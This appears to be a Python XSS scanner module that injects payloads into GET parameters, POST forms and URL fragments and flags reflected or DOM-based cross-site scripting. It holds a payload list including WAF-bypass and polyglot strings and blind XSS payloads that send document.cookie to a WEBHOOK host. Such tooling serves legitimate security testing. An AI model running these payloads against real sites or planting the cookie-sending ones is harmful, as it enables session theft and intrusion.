import aiohttp
import asyncio
import re
import html
from urllib.parse import urlparse, parse_qs, urlencode, quote
from modules.core import console

XSS_PAYLOADS = {
    "basic": [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "<iframe src=javascript:alert(1)></iframe>",
        "<body onload=alert(1)>",
        "<input onfocus=alert(1) autofocus>",
        "<select onfocus=alert(1) autofocus>",
        "<textarea onfocus=alert(1) autofocus>",
        "<video><source onerror=alert(1)>",
        "<details open ontoggle=alert(1)>"
    ],
    "attribute_breaking": [
        '"onmouseover=alert(1)//',
        "'onmouseover=alert(1)//",
        '"><script>alert(1)</script>',
        "'><script>alert(1)</script>",
        '" autofocus onfocus=alert(1) x="',
        "' autofocus onfocus=alert(1) x='",
        '"><img src=x onerror=alert(1)>',
        "'><img src=x onerror=alert(1)>"
    ],
    "tag_breaking": [
        "</script><script>alert(1)</script>",
        "</title><script>alert(1)</script>",
        "</textarea><script>alert(1)</script>",
        "</style><script>alert(1)</script>",
        "</noscript><script>alert(1)</script>",
        "</pre><script>alert(1)</script>"
    ],
    "javascript_protocol": [
        "javascript:alert(1)",
        "javascript:alert(String.fromCharCode(88,83,83))",
        "javascript:alert(/XSS/)",
        "javascript:alert`1`",
        "javascript:alert(document.domain)",
        "javascript:alert(document.cookie)"
    ],
    "event_handlers": [
        "<img src=x onerror=alert(1)>",
        "<img src=x onload=alert(1)>",
        "<img src=x onmouseover=alert(1)>",
        "<div onmouseover=alert(1)>test</div>",
        "<span onclick=alert(1)>test</span>",
        "<button onclick=alert(1)>test</button>",
        "<details open ontoggle=alert(1)>test"
    ],
    "polyglot": [
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()///>\\x3e",
        "'\"--></style></script><svg onload=alert(1)><!--",
        "</script><svg onload=alert(1)>",
        "'><script>alert(String.fromCharCode(88,83,83))</script>",
        "\"'><img src=x onerror=alert(1)>//"
    ],
    "waf_bypass": [
        "<ScRiPt>alert(1)</ScRiPt>",
        "<script>alert(String.fromCharCode(88,83,83))</script>",
        "<script>alert(/XSS/)</script>",
        "<script>alert`1`</script>",
        "<script>eval(atob('YWxlcnQoMSk='))</script>",
        "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
        "<svg/onload=alert(1)>",
        "<img/src=x/onerror=alert(1)>",
        "<script>window['alert'](1)</script>",
        "<script>(alert)(1)</script>",
        "<script>alert.call(null,1)</script>",
        "<%2Fscript><%73cript>alert(1)<%2Fscript>",
    ],
    "dom_based": [
        "#<script>alert(1)</script>",
        "#<img src=x onerror=alert(1)>",
        "#javascript:alert(1)",
        "#data:text/html,<script>alert(1)</script>"
    ],
    "blind_xss": [
        '<script src="https://WEBHOOK/x?c=blind_xss"></script>',
        '<img src="x" onerror="new Image().src=\'https://WEBHOOK/x?c=blind_xss&d=\'+document.cookie">',
        '"><script src="https://WEBHOOK/x?c=blind_xss"></script>',
    ]
}

XSS_INDICATORS = [
    r"<script[^>]*>.*?</script>",
    r"<img[^>]*onerror[^>]*>",
    r"<svg[^>]*onload[^>]*>",
    r"<iframe[^>]*src[^>]*javascript:",
    r"on\w+\s*=\s*['\"]?[^'\"]*alert\s*\(",
    r"javascript:\s*alert\s*\(",
    r"<\w+[^>]*\son\w+[^>]*>",
    r"<details[^>]*ontoggle[^>]*>",
]


async def detect_xss_context(response_text, payload):
    """Detect the context where XSS payload is reflected"""
    contexts = []

    if payload in response_text:
        if re.search(r'<[^>]*' + re.escape(payload) + r'[^>]*>', response_text):
            contexts.append("attribute")
        if re.search(r'<script[^>]*>.*?' + re.escape(payload) + r'.*?</script>', response_text, re.DOTALL):
            contexts.append("script")
        if re.search(r'<style[^>]*>.*?' + re.escape(payload) + r'.*?</style>', response_text, re.DOTALL):
            contexts.append("style")
        if not contexts:
            contexts.append("html")

    return contexts if contexts else ["unknown"]
async def test_xss_payload(session, url, param, payload, original_response):
    """Test a single XSS payload on a GET parameter"""
    try:
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        params[param] = [payload]
        query_string = urlencode(params, doseq=True)
        test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{query_string}"

        async with session.get(test_url, timeout=aiohttp.ClientTimeout(total=12), ssl=False) as resp:
            response_text = await resp.text(errors='replace')

            if payload in response_text:
                contexts = await detect_xss_context(response_text, payload)

                is_executable = any(
                    re.search(pat, response_text, re.IGNORECASE)
                    for pat in XSS_INDICATORS
                )

                encoded_payload = html.escape(payload)
                is_encoded = encoded_payload in response_text and payload not in response_text

                return {
                    "reflected": True,
                    "executable": is_executable,
                    "encoded": is_encoded,
                    "contexts": contexts,
                    "url": test_url,
                    "payload": payload,
                    "response_length": len(response_text)
                }
    except Exception:
        pass

    return None


async def test_reflected_xss(session, url, param, original_response):
    """Test for reflected XSS vulnerabilities on GET parameter"""
    vulnerabilities = []
    all_payloads = []
    for category, payloads in XSS_PAYLOADS.items():
        if category == "blind_xss":
            continue
        all_payloads.extend(payloads[:3])

    for payload in all_payloads:
        result = await test_xss_payload(session, url, param, payload, original_response)

        if result and result["reflected"] and not result["encoded"]:
            severity = "Critical" if result["executable"] else "High"

            console.print(f"  [bold red][!] XSS Vulnerability Found (Reflected)[/bold red]")
            console.print(f"    [cyan]Parameter:[/cyan] {param}")
            console.print(f"    [cyan]Payload:[/cyan] {payload}")
            console.print(f"    [cyan]Context:[/cyan] {', '.join(result['contexts'])}")
            console.print(f"    [cyan]Executable:[/cyan] {result['executable']}")
            console.print(f"    [cyan]Severity:[/cyan] {severity}")
            console.print(f"    [cyan]URL:[/cyan] {result['url']}")

            vulnerabilities.append({
                "type": "Cross-Site Scripting (Reflected)",
                "method": "GET",
                "parameter": param,
                "payload": payload,
                "url": result["url"],
                "contexts": result["contexts"],
                "executable": result["executable"],
                "severity": severity
            })
            break

        await asyncio.sleep(0.08)
    return vulnerabilities

async def test_post_xss(session, form, webhook_url=None):
    """Test XSS via POST form parameters"""
    vulnerabilities = []
    action_url = form.get("action", "")
    inputs = form.get("inputs", [])

    if not action_url or not inputs:
        return vulnerabilities

    test_payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        '"><script>alert(1)</script>',
        "'><img src=x onerror=alert(1)>",
        "<details open ontoggle=alert(1)>",
    ]

    if webhook_url:
        test_payloads.append(f'<script src="{webhook_url}?c=blind_xss"></script>')

    for target_input in inputs:
        param_name = target_input.get("name", "")
        if not param_name:
            continue

        for payload in test_payloads:
            post_data = {}
            for inp in inputs:
                n = inp.get("name", "")
                if n == param_name:
                    post_data[n] = payload
                else:
                    post_data[n] = inp.get("value", "test")

            try:
                async with session.post(action_url, data=post_data,
                                        timeout=aiohttp.ClientTimeout(total=12), ssl=False) as resp:
                    response_text = await resp.text(errors='replace')

                    if payload in response_text:
                        encoded = html.escape(payload) in response_text and payload not in response_text
                        if not encoded:
                            is_executable = any(
                                re.search(pat, response_text, re.IGNORECASE)
                                for pat in XSS_INDICATORS
                            )
                            severity = "Critical" if is_executable else "High"

                            console.print(f"  [bold red][!] POST XSS Vulnerability Found[/bold red]")
                            console.print(f"    [cyan]Form:[/cyan] {action_url}")
                            console.print(f"    [cyan]Parameter:[/cyan] {param_name}")
                            console.print(f"    [cyan]Payload:[/cyan] {payload}")
                            console.print(f"    [cyan]Severity:[/cyan] {severity}")

                            vulnerabilities.append({
                                "type": "Cross-Site Scripting (POST Reflected)",
                                "method": "POST",
                                "form_url": action_url,
                                "parameter": param_name,
                                "param": param_name,
                                "payload": payload,
                                "url": action_url,
                                "executable": is_executable,
                                "severity": severity
                            })
                            break
            except Exception:
                continue

        await asyncio.sleep(0.2)
    return vulnerabilities

async def test_dom_xss(session, url):
    """Test for DOM-based XSS vulnerabilities"""
    vulnerabilities = []

    dom_sinks = [
        r"document\.write\s*\(",
        r"innerHTML\s*=",
        r"outerHTML\s*=",
        r"document\.location",
        r"window\.location",
        r"eval\s*\(",
        r"setTimeout\s*\(",
        r"setInterval\s*\(",
        r"location\.href\s*=",
        r"document\.URL",
        r"location\.hash",
        r"location\.search",
    ]

    for payload in XSS_PAYLOADS["dom_based"]:
        try:
            test_url = f"{url}{payload}"
            async with session.get(test_url, timeout=aiohttp.ClientTimeout(total=12), ssl=False) as resp:
                response_text = await resp.text(errors='replace')

                matched_sinks = []
                for sink_pattern in dom_sinks:
                    if re.search(sink_pattern, response_text, re.IGNORECASE):
                        matched_sinks.append(sink_pattern)

                if matched_sinks:
                    console.print(f"  [bold yellow][!] Potential DOM XSS Sinks Found[/bold yellow]")
                    console.print(f"    [cyan]URL:[/cyan] {test_url}")
                    console.print(f"    [cyan]Sinks:[/cyan] {', '.join(matched_sinks[:3])}")

                    vulnerabilities.append({
                        "type": "Cross-Site Scripting (DOM-Based)",
                        "sink_patterns": matched_sinks,
                        "url": test_url,
                        "payload": payload,
                        "severity": "Medium",
                        "confidence": "Low",
                        "evidence": ", ".join(matched_sinks[:3])
                    })
                    break
        except Exception:
            continue

    return vulnerabilities


async def test_xss_comprehensive(session, url, webhook_url=None):
    """Comprehensive XSS testing on a single URL"""
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    vulnerabilities = []

    try:
        async with session.get(url, timeout=aiohttp.ClientTimeout(total=12), ssl=False) as resp:
            original_response = await resp.text(errors='replace')
    except Exception:
        return []

    if params:
        for param in params:
            console.print(f"[dim]  [XSS] Testing param: {param}[/dim]")
            reflected_vulns = await test_reflected_xss(session, url, param, original_response)
            vulnerabilities.extend(reflected_vulns)
            await asyncio.sleep(0.3)

    dom_vulns = await test_dom_xss(session, url)
    vulnerabilities.extend(dom_vulns)

    return vulnerabilities


async def run_xss_scan(session, urls, forms=None, webhook_url=None):
    """Advanced XSS scanner — GET parameters + POST forms"""
    console.print("\n[bold red]--- Advanced XSS Scanner ---[/bold red]")
    console.print("[dim]Testing Reflected, DOM-Based, Context-Aware XSS (GET + POST)...[/dim]")
    if webhook_url:
        console.print(f"[dim]Blind XSS webhook: {webhook_url}[/dim]")

    all_vulnerabilities = []
    for url in urls:
        console.print(f"\n[bold cyan][XSS] Testing URL:[/bold cyan] {url}")
        vulns = await test_xss_comprehensive(session, url, webhook_url)
        all_vulnerabilities.extend(vulns)
        await asyncio.sleep(0.5)

    if forms:
        console.print(f"\n[bold cyan][XSS] Testing {len(forms)} forms (POST)...[/bold cyan]")
        for form in forms:
            if form.get('method', 'get').lower() == 'post':
                console.print(f"  [dim]Form: {form.get('action')}[/dim]")
                vulns = await test_post_xss(session, form, webhook_url)
                all_vulnerabilities.extend(vulns)
                await asyncio.sleep(0.5)

    if all_vulnerabilities:
        critical = [v for v in all_vulnerabilities if v.get("severity") == "Critical"]
        high = [v for v in all_vulnerabilities if v.get("severity") == "High"]
        reflected = [v for v in all_vulnerabilities if "Reflected" in v["type"]]
        dom = [v for v in all_vulnerabilities if "DOM" in v["type"]]

        console.print(f"\n[bold red][!] {len(all_vulnerabilities)} XSS vulnerabilities found![/bold red]")
        if critical:
            console.print(f"    [bold red]Critical: {len(critical)}[/bold red]")
        if high:
            console.print(f"    [bold yellow]High: {len(high)}[/bold yellow]")
        if reflected:
            console.print(f"    Reflected XSS: {len(reflected)}")
        if dom:
            console.print(f"    DOM XSS: {len(dom)}")
    else:
        console.print("\n[bold green][+] No XSS vulnerabilities detected[/bold green]")

    return all_vulnerabilities
